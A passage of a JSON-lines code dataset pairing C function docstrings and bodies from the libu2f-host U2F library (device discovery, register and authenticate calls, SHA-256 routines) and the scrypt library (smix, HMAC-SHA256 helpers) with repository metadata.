cur_dev->product_string,\n\t\t\t\tlen);\n\t\t      if (debug)\n\t\t\t{\n\t\t\t  fprintf (stderr, \"device %s discovered as '%s'\\n\",\n\t\t\t\t   dev->device_path, dev->device_string);\n\t\t\t  fprintf (stderr,\n\t\t\t\t   \"  version (Interface, Major, \"\n\t\t\t\t   \"Minor, Build): %d, %d, \"\n\t\t\t\t   \"%d, %d  capFlags: %d\\n\",\n\t\t\t\t   dev->versionInterface,\n\t\t\t\t   dev->versionMajor,\n\t\t\t\t   dev->versionMinor,\n\t\t\t\t   dev->versionBuild, dev->capFlags);\n\t\t\t}\n\t\t    }\n\t\t  res = U2FH_OK;\n\t\t  continue;\n\t\t}\n\t    }\n\t  close_device (devs, dev);\n\t}\n    }\n\n\n  /* loop through all open devices and make sure we find them in the enumeration */\n  dev = devs->first;\n  while (dev)\n    {\n      int found = 0;\n\n      for (cur_dev = di; cur_dev; cur_dev = cur_dev->next)\n\t{\n\t  if (strcmp (cur_dev->path, dev->device_path) == 0)\n\t    {\n\t      found = 1;\n\t      dev = dev->next;\n\t      break;\n\t    }\n\t}\n      if (!found)\n\t{\n\t  if (debug)\n\t    {\n\t      fprintf (stderr, \"device %s looks dead.\\n\", dev->device_path);\n\t    }\n\t  dev = close_device (devs, dev);\n\t}\n    }\n\nout:\n  hid_free_enumeration (di);\n  if (res == U2FH_OK && max_index)\n    *max_index = devs->max_id - 1;\n\n  return res;\n}", "path": "u2f-host\\devs.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/* Process LEN bytes of BUFFER, accumulating context into CTX.\n   It is assumed that LEN % 64 == 0.\n   Most of this code comes from GnuPG's cipher/sha1.c.  */\n", "func_signal": "void\nsha256_process_block (const void *buffer, size_t len, struct sha256_ctx *ctx)", "code": "{\n  const uint32_t *words = buffer;\n  size_t nwords = len / sizeof (uint32_t);\n  const uint32_t *endp = words + nwords;\n  uint32_t x[16];\n  uint32_t a = ctx->state[0];\n  uint32_t b = ctx->state[1];\n  uint32_t c = ctx->state[2];\n  uint32_t d = ctx->state[3];\n  uint32_t e = ctx->state[4];\n  uint32_t f = ctx->state[5];\n  uint32_t g = ctx->state[6];\n  uint32_t h = ctx->state[7];\n  uint32_t lolen = len;\n\n  /* First increment the byte count.  FIPS PUB 180-2 specifies the possible\n     length of the file up to 2^64 bits.  Here we only compute the\n     number of bytes.  Do a double word increment.  */\n  ctx->total[0] += lolen;\n  ctx->total[1] += (len >> 31 >> 1) + (ctx->total[0] < lolen);\n\n#define rol(x, n) (((x) << (n)) | ((x) >> (32 - (n))))\n#define S0(x) (rol(x,25)^rol(x,14)^(x>>3))\n#define S1(x) (rol(x,15)^rol(x,13)^(x>>10))\n#define SS0(x) (rol(x,30)^rol(x,19)^rol(x,10))\n#define SS1(x) (rol(x,26)^rol(x,21)^rol(x,7))\n\n#define M(I) ( tm =   S1(x[(I-2)&0x0f]) + x[(I-7)&0x0f] \\\n                    + S0(x[(I-15)&0x0f]) + x[I&0x0f]    \\\n               , x[I&0x0f] = tm )\n\n#define R(A,B,C,D,E,F,G,H,K,M)  do { t0 = SS0(A) + F2(A,B,C); \\\n                                     t1 = H + SS1(E)  \\\n                                      + F1(E,F,G)     \\\n                                      + K             \\\n                                      + M;            \\\n                                     D += t1;  H = t0 + t1; \\\n                               } while(0)\n\n  while (words < endp)\n    {\n      uint32_t tm;\n      uint32_t t0, t1;\n      int t;\n      /* FIXME: see sha1.c for a better implementation.  */\n      for (t = 0; t < 16; t++)\n        {\n          x[t] = SWAP (*words);\n          words++;\n        }\n\n      R( a, b, c, d, e, f, g, h, K( 0), x[ 0] );\n      R( h, a, b, c, d, e, f, g, K( 1), x[ 1] );\n      R( g, h, a, b, c, d, e, f, K( 2), x[ 2] );\n      R( f, g, h, a, b, c, d, e, K( 3), x[ 3] );\n      R( e, f, g, h, a, b, c, d, K( 4), x[ 4] );\n      R( d, e, f, g, h, a, b, c, K( 5), x[ 5] );\n      R( c, d, e, f, g, h, a, b, K( 6), x[ 6] );\n      R( b, c, d, e, f, g, h, a, K( 7), x[ 7] );\n      R( a, b, c, d, e, f, g, h, K( 8), x[ 8] );\n      R( h, a, b, c, d, e, f, g, K( 9), x[ 9] );\n      R( g, h, a, b, c, d, e, f, K(10), x[10] );\n      R( f, g, h, a, b, c, d, e, K(11), x[11] );\n      R( e, f, g, h, a, b, c, d, K(12), x[12] );\n      R( d, e, f, g, h, a, b, c, K(13), x[13] );\n      R( c, d, e, f, g, h, a, b, K(14), x[14] );\n      R( b, c, d, e, f, g, h, a, K(15), x[15] );\n      R( a, b, c, d, e, f, g, h, K(16), M(16) );\n      R( h, a, b, c, d, e, f, g, K(17), M(17) );\n      R( g, h, a, b, c, d, e, f, K(18), M(18) );\n      R( f, g, h, a, b, c, d, e, K(19), M(19) );\n      R( e, f, g, h, a, b, c, d, K(20), M(20) );\n      R( d, e, f, g, h, a, b, c, K(21), M(21) );\n      R( c, d, e, f, g, h, a, b, K(22), M(22) );\n      R( b, c, d, e, f, g, h, a, K(23), M(23) );\n      R( a, b, c, d, e, f, g, h, K(24), M(24) );\n      R( h, a, b, c, d, e, f, g, K(25), M(25) );\n      R( g, h, a, b, c, d, e, f, K(26), M(26) );\n      R( f, g, h, a, b, c, d, e, K(27), M(27) );\n      R( e, f, g, h, a, b, c, d, K(28), M(28) );\n      R( d, e, f, g, h, a, b, c, K(29), M(29) );\n      R( c, d, e, f, g, h, a, b, K(30), M(30) );\n      R( b, c, d, e, f, g, h, a, K(31), M(31) );\n      R( a, b, c, d, e, f, g, h, K(32), M(32) );\n      R( h, a, b, c, d, e, f, g, K(33), M(33) );\n      R( g, h, a, b, c, d, e, f, K(34), M(34) );\n      R( f, g, h, a, b, c, d, e, K(35), M(35) );\n      R( e, f, g, h, a, b, c, d, K(36), M(36) );\n      R( d, e, f, g, h, a, b, c, K(37), M(37) );\n      R( c, d, e, f, g, h, a, b, K(38), M(38) );\n      R( b, c, d, e, f, g, h, a, K(39), M(39) );\n      R( a, b, c, d, e, f, g, h, K(40), M(40) );\n      R( h, a, b, c, d, e, f, g, K(41), M(41) );\n      R( g, h, a, b, c, d, e, f, K(42), M(42) );\n      R( f, g, h, a, b, c, d, e, K(43), M(43) );\n      R( e, f, g, h, a, b, c, d, K(44), M(44) );\n      R( d, e, f, g, h, a, b, c, K(45), M(45) );\n      R( c, d, e, f, g, h, a, b, K(46), M(46) );\n      R( b, c, d, e, f, g, h, a, K(47), M(47) );\n      R( a, b, c, d, e, f, g, h, K(48), M(48) );\n      R( h, a, b, c, d, e, f, g, K(49), M(49) );\n      R( g, h, a, b, c, d, e, f, K(50), M(50) );\n      R( f, g, h, a, b, c, d, e, K(51), M(51) );\n      R( e, f, g, h, a, b, c, d, K(52), M(52) );\n      R( d, e, f, g, h, a, b, c, K(53), M(53) );\n      R( c, d, e, f, g, h, a, b, K(54), M(54) );\n      R( b, c, d, e, f, g, h, a, K(55), M(55) );\n      R( a, b, c, d, e, f, g, h, K(56), M(56) );\n      R( h, a, b, c, d, e, f, g, K(57), M(57) );\n      R( g, h, a, b, c, d, e, f, K(58), M(58) );\n      R( f, g, h, a, b, c, d, e, K(59), M(59) );\n      R( e, f, g, h, a, b, c, d, K(60), M(60) );\n      R( d, e, f, g, h, a, b, c, K(61), M(61) );\n      R( c, d, e, f, g, h, a, b, K(62), M(62) );\n      R( b, c, d, e, f, g, h, a, K(63), M(63) );\n\n      a = ctx->state[0] += a;\n      b = ctx->state[1] += b;\n      c = ctx->state[2] += c;\n      d = ctx->state[3] += d;\n      e = ctx->state[4] += e;\n      f = ctx->state[5] += f;\n      g = ctx->state[6] += g;\n      h = ctx->state[7] += h;\n    }\n}", "path": "gl\\sha256.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/**\n * u2fh_get_device_description:\n * @devs: device_handle, from u2fh_devs_init().\n * @index: index of device\n * @out: buffer for storing device description\n * @len: maximum amount of data to store in @out. Will be updated.\n *\n * Get the device description of the device at @index. Stores the\n * string in @out.\n *\n * Returns: %U2FH_OK on success.\n */\n", "func_signal": "u2fh_rc\nu2fh_get_device_description (u2fh_devs * devs, unsigned index, char *out,\n\t\t\t     size_t * len)", "code": "{\n  size_t i;\n  struct u2fdevice *dev = get_device (devs, index);\n\n  if (!dev)\n    {\n      return U2FH_NO_U2F_DEVICE;\n    }\n  i = strlen (dev->device_string);\n  if (i < *len)\n    {\n      *len = i;\n    }\n  else\n    {\n      return U2FH_MEMORY_ERROR;\n    }\n  strcpy (out, dev->device_string);\n  return U2FH_OK;\n}", "path": "u2f-host\\devs.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/* Compute SHA256 message digest for bytes read from STREAM.  The\n   resulting message digest number will be written into the 32 bytes\n   beginning at RESBLOCK.  */\n", "func_signal": "int\nsha256_stream (FILE *stream, void *resblock)", "code": "{\n  struct sha256_ctx ctx;\n  size_t sum;\n\n  char *buffer = malloc (BLOCKSIZE + 72);\n  if (!buffer)\n    return 1;\n\n  /* Initialize the computation context.  */\n  sha256_init_ctx (&ctx);\n\n  /* Iterate over full file contents.  */\n  while (1)\n    {\n      /* We read the file in blocks of BLOCKSIZE bytes.  One call of the\n         computation function processes the whole buffer so that with the\n         next round of the loop another block can be read.  */\n      size_t n;\n      sum = 0;\n\n      /* Read block.  Take care for partial reads.  */\n      while (1)\n        {\n          n = fread (buffer + sum, 1, BLOCKSIZE - sum, stream);\n\n          sum += n;\n\n          if (sum == BLOCKSIZE)\n            break;\n\n          if (n == 0)\n            {\n              /* Check for the error flag IFF N == 0, so that we don't\n                 exit the loop after a partial read due to e.g., EAGAIN\n                 or EWOULDBLOCK.  */\n              if (ferror (stream))\n                {\n                  free (buffer);\n                  return 1;\n                }\n              goto process_partial_block;\n            }\n\n          /* We've read at least one byte, so ignore errors.  But always\n             check for EOF, since feof may be true even though N > 0.\n             Otherwise, we could end up calling fread after EOF.  */\n          if (feof (stream))\n            goto process_partial_block;\n        }\n\n      /* Process buffer with BLOCKSIZE bytes.  Note that\n                        BLOCKSIZE % 64 == 0\n       */\n      sha256_process_block (buffer, BLOCKSIZE, &ctx);\n    }\n\n process_partial_block:;\n\n  /* Process any remaining bytes.  */\n  if (sum > 0)\n    sha256_process_bytes (buffer, sum, &ctx);\n\n  /* Construct result in desired memory.  */\n  sha256_finish_ctx (&ctx, resblock);\n  free (buffer);\n  return 0;\n}", "path": "gl\\sha256.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/**\n * u2fh_is_alive:\n * @devs: device_handle, from u2fh_devs_init().\n * @index: index of device\n *\n * Get the liveliness of the device @index.\n *\n * Returns: 1 if the device is considered alive, 0 otherwise.\n */\n", "func_signal": "int\nu2fh_is_alive (u2fh_devs * devs, unsigned index)", "code": "{\n  if (!get_device (devs, index))\n    return 0;\n  return 1;\n}", "path": "u2f-host\\devs.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/**\n * u2fh_devs_done:\n * @devs: device handle, from u2fh_devs_init().\n *\n * Release all resources associated with @devs.  This function must be\n * called when you are finished with a device handle.\n */\n", "func_signal": "void\nu2fh_devs_done (u2fh_devs * devs)", "code": "{\n  close_devices (devs);\n  hid_exit ();\n\n  free (devs);\n}", "path": "u2f-host\\devs.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/**\n * u2fh_authenticate:\n * @devs: a device handle, from u2fh_devs_init() and u2fh_devs_discover().\n * @challenge: string with JSON data containing the challenge.\n * @origin: U2F origin URL.\n * @response: pointer to pointer for output data\n * @flags: set of ORed #u2fh_cmdflags values.\n *\n * Perform the U2F Authenticate operation.\n *\n * Returns: On success %U2FH_OK (integer 0) is returned, and on errors\n * an #u2fh_rc error code.\n */\n", "func_signal": "u2fh_rc\nu2fh_authenticate (u2fh_devs * devs,\n\t\t   const char *challenge,\n\t\t   const char *origin, char **response, u2fh_cmdflags flags)", "code": "{\n  size_t response_len = 0;\n\n  *response = NULL;\n  return _u2fh_authenticate (devs, challenge, origin, response, &response_len,\n\t\t\t     flags);\n}", "path": "u2f-host\\authenticate.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/* Put result from CTX in first 32 bytes following RESBUF.  The result\n   must be in little endian byte order.  */\n", "func_signal": "void *\nsha256_read_ctx (const struct sha256_ctx *ctx, void *resbuf)", "code": "{\n  int i;\n  char *r = resbuf;\n\n  for (i = 0; i < 8; i++)\n    set_uint32 (r + i * sizeof ctx->state[0], SWAP (ctx->state[i]));\n\n  return resbuf;\n}", "path": "gl\\sha256.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/**\n * u2fh_strerror:\n * @err: error code\n *\n * Convert return code to human readable string explanation of the\n * reason for the particular error code.\n *\n * This string can be used to output a diagnostic message to the user.\n *\n * This function is one of few in the library that can be used without\n * a successful call to u2fh_global_init().\n *\n * Return value: Returns a pointer to a statically allocated string\n *   containing an explanation of the error code @err.\n **/\n", "func_signal": "const char *\nu2fh_strerror (int err)", "code": "{\n  static const char *unknown = \"Unknown libu2f-host error\";\n  const char *p;\n\n  if (-err < 0 || -err >= (int) (sizeof (errors) / sizeof (errors[0])))\n    return unknown;\n\n  p = errors[-err].description;\n  if (!p)\n    p = unknown;\n\n  return p;\n}", "path": "u2f-host\\error.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/* Process the remaining bytes in the internal buffer and the usual\n   prolog according to the standard and write the result to RESBUF.  */\n", "func_signal": "static void\nsha256_conclude_ctx (struct sha256_ctx *ctx)", "code": "{\n  /* Take yet unprocessed bytes into account.  */\n  size_t bytes = ctx->buflen;\n  size_t size = (bytes < 56) ? 64 / 4 : 64 * 2 / 4;\n\n  /* Now count remaining bytes.  */\n  ctx->total[0] += bytes;\n  if (ctx->total[0] < bytes)\n    ++ctx->total[1];\n\n  /* Put the 64-bit file length in *bits* at the end of the buffer.\n     Use set_uint32 rather than a simple assignment, to avoid risk of\n     unaligned access.  */\n  set_uint32 ((char *) &ctx->buffer[size - 2],\n              SWAP ((ctx->total[1] << 3) | (ctx->total[0] >> 29)));\n  set_uint32 ((char *) &ctx->buffer[size - 1],\n              SWAP (ctx->total[0] << 3));\n\n  memcpy (&((char *) ctx->buffer)[bytes], fillbuf, (size - 2) * 4 - bytes);\n\n  /* Process last bytes.  */\n  sha256_process_block (ctx->buffer, size * 4, ctx);\n}", "path": "gl\\sha256.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/**\n * u2fh_register2:\n * @devs: a device set handle, from u2fh_devs_init() and u2fh_devs_discover().\n * @challenge: string with JSON data containing the challenge.\n * @origin: U2F origin URL.\n * @response: pointer to output string with JSON data.\n * @response_len: pointer to length of @response\n * @flags: set of ORed #u2fh_cmdflags values.\n *\n * Perform the U2F Register operation.\n *\n * Returns: On success %U2FH_OK (integer 0) is returned, and on errors\n * an #u2fh_rc error code.\n */\n", "func_signal": "u2fh_rc\nu2fh_register2 (u2fh_devs * devs,\n\t\tconst char *challenge,\n\t\tconst char *origin, char *response, size_t * response_len,\n\t\tu2fh_cmdflags flags)", "code": "{\n  return _u2fh_register (devs, challenge, origin, &response, response_len,\n\t\t\t flags);\n}", "path": "u2f-host\\register.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/* FIXME: Avoid code duplication */\n", "func_signal": "int\nsha224_stream (FILE *stream, void *resblock)", "code": "{\n  struct sha256_ctx ctx;\n  size_t sum;\n\n  char *buffer = malloc (BLOCKSIZE + 72);\n  if (!buffer)\n    return 1;\n\n  /* Initialize the computation context.  */\n  sha224_init_ctx (&ctx);\n\n  /* Iterate over full file contents.  */\n  while (1)\n    {\n      /* We read the file in blocks of BLOCKSIZE bytes.  One call of the\n         computation function processes the whole buffer so that with the\n         next round of the loop another block can be read.  */\n      size_t n;\n      sum = 0;\n\n      /* Read block.  Take care for partial reads.  */\n      while (1)\n        {\n          n = fread (buffer + sum, 1, BLOCKSIZE - sum, stream);\n\n          sum += n;\n\n          if (sum == BLOCKSIZE)\n            break;\n\n          if (n == 0)\n            {\n              /* Check for the error flag IFF N == 0, so that we don't\n                 exit the loop after a partial read due to e.g., EAGAIN\n                 or EWOULDBLOCK.  */\n              if (ferror (stream))\n                {\n                  free (buffer);\n                  return 1;\n                }\n              goto process_partial_block;\n            }\n\n          /* We've read at least one byte, so ignore errors.  But always\n             check for EOF, since feof may be true even though N > 0.\n             Otherwise, we could end up calling fread after EOF.  */\n          if (feof (stream))\n            goto process_partial_block;\n        }\n\n      /* Process buffer with BLOCKSIZE bytes.  Note that\n                        BLOCKSIZE % 64 == 0\n       */\n      sha256_process_block (buffer, BLOCKSIZE, &ctx);\n    }\n\n process_partial_block:;\n\n  /* Process any remaining bytes.  */\n  if (sum > 0)\n    sha256_process_bytes (buffer, sum, &ctx);\n\n  /* Construct result in desired memory.  */\n  sha224_finish_ctx (&ctx, resblock);\n  free (buffer);\n  return 0;\n}", "path": "gl\\sha256.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/**\n * u2fh_authenticate2:\n * @devs: a device handle, from u2fh_devs_init() and u2fh_devs_discover().\n * @challenge: string with JSON data containing the challenge.\n * @origin: U2F origin URL.\n * @response: pointer to string for output data\n * @response_len: pointer to length of @response\n * @flags: set of ORed #u2fh_cmdflags values.\n *\n * Perform the U2F Authenticate operation.\n *\n * Returns: On success %U2FH_OK (integer 0) is returned, and on errors\n * an #u2fh_rc error code.\n */\n", "func_signal": "u2fh_rc\nu2fh_authenticate2 (u2fh_devs * devs,\n\t\t    const char *challenge,\n\t\t    const char *origin, char *response, size_t * response_len,\n\t\t    u2fh_cmdflags flags)", "code": "{\n  return _u2fh_authenticate (devs, challenge, origin, &response, response_len,\n\t\t\t     flags);\n}", "path": "u2f-host\\authenticate.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/* Compute SHA512 message digest for LEN bytes beginning at BUFFER.  The\n   result is always in little endian byte order, so that a byte-wise\n   output yields to the wanted ASCII representation of the message\n   digest.  */\n", "func_signal": "void *\nsha256_buffer (const char *buffer, size_t len, void *resblock)", "code": "{\n  struct sha256_ctx ctx;\n\n  /* Initialize the computation context.  */\n  sha256_init_ctx (&ctx);\n\n  /* Process whole buffer but last len % 64 bytes.  */\n  sha256_process_bytes (buffer, len, &ctx);\n\n  /* Put result in desired memory area.  */\n  return sha256_finish_ctx (&ctx, resblock);\n}", "path": "gl\\sha256.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/* _WIN32 */\n", "func_signal": "static int\ninit_device (u2fh_devs * devs, struct u2fdevice *dev)", "code": "{\n  unsigned char resp[1024];\n  unsigned char nonce[8];\n  if (obtain_nonce(nonce) != 0)\n    {\n      return U2FH_TRANSPORT_ERROR;\n    }\n  size_t resplen = sizeof (resp);\n  dev->cid = CID_BROADCAST;\n\n  if (u2fh_sendrecv\n      (devs, dev->id, U2FHID_INIT, nonce, sizeof (nonce), resp,\n       &resplen) == U2FH_OK)\n    {\n      int offs = sizeof (nonce);\n      /* the response has to be at least 17 bytes, if it's less we discard it */\n      if (resplen < 17)\n\t{\n\t  return U2FH_SIZE_ERROR;\n\t}\n\n      /* incoming and outgoing nonce has to match */\n      if (memcmp (nonce, resp, sizeof (nonce)) != 0)\n\t{\n\t  return U2FH_TRANSPORT_ERROR;\n\t}\n\n\n      memcpy((uint8_t*)&dev->cid, resp + offs, sizeof(dev->cid));\n      offs += 4;\n      dev->versionInterface = resp[offs++];\n      dev->versionMajor = resp[offs++];\n      dev->versionMinor = resp[offs++];\n      dev->versionBuild = resp[offs++];\n      dev->capFlags = resp[offs++];\n    }\n  else\n    {\n      return U2FH_TRANSPORT_ERROR;\n    }\n  return U2FH_OK;\n}", "path": "u2f-host\\devs.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/**\n * u2fh_global_init:\n * @flags: initialization flags, ORed #u2fh_initflags.\n *\n * Initialize the library.  This function is not guaranteed to be\n * thread safe and must be invoked on application startup.\n *\n * Returns: On success %U2FH_OK (integer 0) is returned, and on errors\n * an #u2fh_rc error code.\n */\n", "func_signal": "u2fh_rc\nu2fh_global_init (u2fh_initflags flags)", "code": "{\n  if (flags & U2FH_DEBUG)\n    debug = 1;\n\n  return U2FH_OK;\n}", "path": "u2f-host\\global.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/* Check that the version of the library (i.e., the CPP symbol VERSION)\n * is at minimum the requested one in REQ_VERSION (typically found in\n * a header file) and return the version string.  Return NULL if the\n * condition is not satisfied.  If a NULL is passed to this function,\n * no check is done, but the version string is simply returned.\n */\n", "func_signal": "const char *\ncheck_version (const char *req_version)", "code": "{\n  if (!req_version || strverscmp (req_version, VERSION) <= 0)\n    return VERSION;\n\n  return NULL;\n}", "path": "gl\\check-version.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/**\n * u2fh_devs_init:\n * @devs: pointer to #u2fh_devs type to initialize.\n *\n * Initialize device handle.\n *\n * Returns: On success %U2FH_OK (integer 0) is returned, on memory\n * allocation errors %U2FH_MEMORY_ERROR is returned, or another\n * #u2fh_rc error code is returned.\n */\n", "func_signal": "u2fh_rc\nu2fh_devs_init (u2fh_devs ** devs)", "code": "{\n  u2fh_devs *d;\n  int rc;\n\n  d = malloc (sizeof (*d));\n  if (d == NULL)\n    return U2FH_MEMORY_ERROR;\n\n  memset (d, 0, sizeof (*d));\n\n  rc = hid_init ();\n  if (rc != 0)\n    {\n      free (d);\n      return U2FH_TRANSPORT_ERROR;\n    }\n\n  *devs = d;\n\n  return U2FH_OK;\n}", "path": "u2f-host\\devs.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/**\n * u2fh_register:\n * @devs: a device set handle, from u2fh_devs_init() and u2fh_devs_discover().\n * @challenge: string with JSON data containing the challenge.\n * @origin: U2F origin URL.\n * @response: pointer to pointer for output data\n * @flags: set of ORed #u2fh_cmdflags values.\n *\n * Perform the U2F Register operation.\n *\n * Returns: On success %U2FH_OK (integer 0) is returned, and on errors\n * an #u2fh_rc error code.\n */\n", "func_signal": "u2fh_rc\nu2fh_register (u2fh_devs * devs,\n\t       const char *challenge,\n\t       const char *origin, char **response, u2fh_cmdflags flags)", "code": "{\n  size_t response_len = 0;\n  *response = NULL;\n  return _u2fh_register (devs, challenge, origin, response, &response_len,\n\t\t\t flags);\n}", "path": "u2f-host\\register.c", "repo_name": "Yubico/libu2f-host", "stars": 321, "license": "gpl-3.0", "language": "c", "size": 542}
{"docstring": "/**\n * smix(B, r, N, V, XY):\n * Compute B = SMix_r(B, N).  The input B must be 128r bytes in length;\n * the temporary storage V must be 128rN bytes in length; the temporary\n * storage XY must be 256r + 64 bytes in length.  The value N must be a\n * power of 2 greater than 1.  The arrays B, V, and XY must be aligned to a\n * multiple of 64 bytes.\n */\n", "func_signal": "static void\nsmix(uint8_t * B, size_t r, uint64_t N, uint32_t * V, uint32_t * XY)", "code": "{\n\tuint32_t * X = XY;\n\tuint32_t * Y = &XY[32 * r];\n\tuint32_t * Z = &XY[64 * r];\n\tuint64_t i;\n\tuint64_t j;\n\tsize_t k;\n\n\t/* 1: X <-- B */\n\tfor (k = 0; k < 32 * r; k++)\n\t\tX[k] = le32dec(&B[4 * k]);\n\n\t/* 2: for i = 0 to N - 1 do */\n\tfor (i = 0; i < N; i += 2) {\n\t\t/* 3: V_i <-- X */\n\t\tblkcpy(&V[i * (32 * r)], X, 128 * r);\n\n\t\t/* 4: X <-- H(X) */\n\t\tblockmix_salsa8(X, Y, Z, r);\n\n\t\t/* 3: V_i <-- X */\n\t\tblkcpy(&V[(i + 1) * (32 * r)], Y, 128 * r);\n\n\t\t/* 4: X <-- H(X) */\n\t\tblockmix_salsa8(Y, X, Z, r);\n\t}\n\n\t/* 6: for i = 0 to N - 1 do */\n\tfor (i = 0; i < N; i += 2) {\n\t\t/* 7: j <-- Integerify(X) mod N */\n\t\tj = integerify(X, r) & (N - 1);\n\n\t\t/* 8: X <-- H(X \\xor V_j) */\n\t\tblkxor(X, &V[j * (32 * r)], 128 * r);\n\t\tblockmix_salsa8(X, Y, Z, r);\n\n\t\t/* 7: j <-- Integerify(X) mod N */\n\t\tj = integerify(Y, r) & (N - 1);\n\n\t\t/* 8: X <-- H(X \\xor V_j) */\n\t\tblkxor(Y, &V[j * (32 * r)], 128 * r);\n\t\tblockmix_salsa8(Y, X, Z, r);\n\t}\n\n\t/* 10: B' <-- X */\n\tfor (k = 0; k < 32 * r; k++)\n\t\tle32enc(&B[4 * k], X[k]);\n}", "path": "ext\\alt-impl\\crypto_scrypt-nosse.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/* Wrapper function for intermediate-values sanitization. */\n", "func_signal": "void\nHMAC_SHA256_Update(HMAC_SHA256_CTX * ctx, const void * in, size_t len)", "code": "{\n\tuint32_t tmp32[72];\n\n\t/* Call the real function. */\n\t_HMAC_SHA256_Update(ctx, in, len, tmp32);\n\n\t/* Clean the stack. */\n\tinsecure_memzero(tmp32, 288);\n}", "path": "ext\\scrypt\\sha256.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/**\n * smix(B, r, N, V, XY):\n * Compute B = SMix_r(B, N).  The input B must be 128r bytes in length; the\n * temporary storage V must be 128rN bytes in length; the temporary storage\n * XY must be 256r bytes in length.  The value N must be a power of 2.\n */\n", "func_signal": "static void\nsmix(uint8_t * B, size_t r, uint64_t N, uint8_t * V, uint8_t * XY)", "code": "{\n\tuint8_t * X = XY;\n\tuint8_t * Y = &XY[128 * r];\n\tuint64_t i;\n\tuint64_t j;\n\n\t/* 1: X <-- B */\n\tblkcpy(X, B, 128 * r);\n\n\t/* 2: for i = 0 to N - 1 do */\n\tfor (i = 0; i < N; i++) {\n\t\t/* 3: V_i <-- X */\n\t\tblkcpy(&V[i * (128 * r)], X, 128 * r);\n\n\t\t/* 4: X <-- H(X) */\n\t\tblockmix_salsa8(X, Y, r);\n\t}\n\n\t/* 6: for i = 0 to N - 1 do */\n\tfor (i = 0; i < N; i++) {\n\t\t/* 7: j <-- Integerify(X) mod N */\n\t\tj = integerify(X, r) & (N - 1);\n\n\t\t/* 8: X <-- H(X \\xor V_j) */\n\t\tblkxor(X, &V[j * (128 * r)], 128 * r);\n\t\tblockmix_salsa8(X, Y, r);\n\t}\n\n\t/* 10: B' <-- X */\n\tblkcpy(B, X, 128 * r);\n}", "path": "ext\\alt-impl\\crypto_scrypt-ref.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/*\n * Decode a big-endian length len vector of (uint8_t) into a length\n * len/4 vector of (uint32_t).  Assumes len is a multiple of 4.\n */\n", "func_signal": "static void\nbe32dec_vect(uint32_t * dst, const uint8_t * src, size_t len)", "code": "{\n\tsize_t i;\n\n\t/* Sanity-check. */\n\tassert(len % 4 == 0);\n\n\t/* Decode vector, one word at a time. */\n\tfor (i = 0; i < len / 4; i++)\n\t\tdst[i] = be32dec(src + i * 4);\n}", "path": "ext\\scrypt\\sha256.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
{"docstring": "/* Wrapper function for intermediate-values sanitization. */\n", "func_signal": "void\nSHA256_Final(uint8_t digest[32], SHA256_CTX * ctx)", "code": "{\n\tuint32_t tmp32[72];\n\n\t/* Call the real function. */\n\t_SHA256_Final(digest, ctx, tmp32);\n\n\t/* Clear the context state. */\n\tinsecure_memzero(ctx, sizeof(SHA256_CTX));\n\n\t/* Clean the stack. */\n\tinsecure_memzero(tmp32, 288);\n}", "path": "ext\\scrypt\\sha256.c", "repo_name": "pbhogan/scrypt", "stars": 260, "license": "other", "language": "c", "size": 261}
